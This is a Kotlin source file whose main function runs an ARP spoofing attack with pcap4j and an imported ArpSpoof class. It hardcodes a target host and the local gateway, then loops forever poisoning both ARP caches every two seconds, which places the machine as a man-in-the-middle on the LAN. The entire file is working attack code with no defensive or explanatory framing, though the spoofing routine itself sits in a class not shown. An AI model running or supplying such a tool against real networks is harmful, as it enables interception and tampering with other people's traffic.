import com.mrx.ArpSpoof
import com.mrx.XLog
import org.pcap4j.util.NifSelector
import java.net.InetAddress

object Main {
    private val logger = XLog.getLogger(this::class.java.name)
    private fun String.toInetAddress() = InetAddress.getByName(this)

    @JvmStatic
    fun main(args: Array<String>) {
        val nif = NifSelector().selectNetworkInterface()
        val arpSpoof = ArpSpoof(nif)
        val targetIP = "192.168.2.150"
        val gatewayIP = "192.168.2.1"
        val target = ArpSpoof.Target(targetIP.toInetAddress())
        val gateway = ArpSpoof.Target(gatewayIP.toInetAddress())
        var count = 1

        while (true) {
            logger.info("sent $count packets")
            arpSpoof.spoof(target, gateway)
            arpSpoof.spoof(gateway, target)
            count += 2
            Thread.sleep(2000)
        }
    }
}